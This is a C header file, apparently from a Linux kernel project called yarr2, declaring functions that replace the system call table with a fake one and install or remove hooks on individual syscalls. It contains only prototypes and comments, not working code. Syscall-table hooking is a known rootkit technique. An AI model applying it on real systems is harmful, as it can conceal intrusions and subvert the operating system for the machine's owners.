#ifndef __YARR_HOOK_SYSCALLS
#define __YARR_HOOK_SYSCALLS

#include <linux/unistd.h>

#define __CAST_TO_SYSCALL(ptr) ((long (*)(const struct pt_regs *))(ptr))

/**
 * Initializes the syscall-hooking subsystem. This function should be called
 * before start using the other primitives. It is singleton, should be called
 * just once.
 *
 * @fake_sct: A pointer to the syscall table that yarr2 provides.
 * @real_sct: A pointer to the original system's syscall table. It is needed
 * so we can jump into the real syscall routines from our hook routines.
 * @return: Zero on success, non-zero elsewhere.
 */
int init_hook_syscalls(unsigned long *fake_sct, unsigned long *real_sct);

/**
 * Stops the syscall-hooking subsystem. This function is a singleton.
 */
int stop_hook_syscalls(void);

/**
 * Installs a new hook function for a specific syscall. The function address
 * passed must be the function generated by the YARRCALL64_DEFINE() macro. This
 * function name takes the form __yarr__x64_sys_<sname> where <sname> is the
 * name of the syscall (i.e. read, write, fork, kill, etc).
 *
 * @n: The syscall number we want to hook (usually one of the __NR_<name>
 * macros.
 * @fnc_addr: The address of the hook function in the form of a unsigned long.
 * @return: Zero on success, non-zero elsewhere.
 */
int install_hook(int n, unsigned long fnc_addr);

/**
 * Uninstall whatever hooks are there for a specific syscall and sets back the
 * original syscall.
 *
 * @n: The syscall number we want to hook.
 * @return: Zero on success, non-zero elsewhere.
 */
int uninstall_hook(int n);

#endif
